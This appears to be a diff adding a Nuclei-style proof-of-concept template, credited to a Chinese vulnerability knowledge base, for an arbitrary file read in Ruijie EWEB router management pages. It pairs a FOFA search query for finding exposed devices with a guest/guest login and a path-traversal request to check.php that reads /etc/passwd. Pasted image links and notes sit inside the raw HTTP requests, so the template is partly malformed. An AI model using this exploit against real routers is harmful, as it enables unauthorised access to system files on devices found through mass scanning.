@@ -1,0 +1,45 @@
+id: poc-qfw91k8io59mmlkf
+info:
+  name: 锐捷EWEB路由器 check.php存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qfw91k8io59mmlkf'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qfw91k8io59mmlkf
+    fofa: title="锐捷网络-EWEB网管系统"
+http:
+- raw:
+  - 'POST /ddi/server/login.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    username=guest&password=guest?
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1745406667267-8db49af6-dc45-4f1a-8429-389cd209a5a2.png)
+
+    利用可用cookie访问接口'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /check.php?a=index&url=../../../../../etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Cookie: RUIJIEID=ukdd3427at8dfl0ku8h9rq40n3;
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1745406667446-a5e387b7-9832-4e7b-ba55-96f870db3258.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
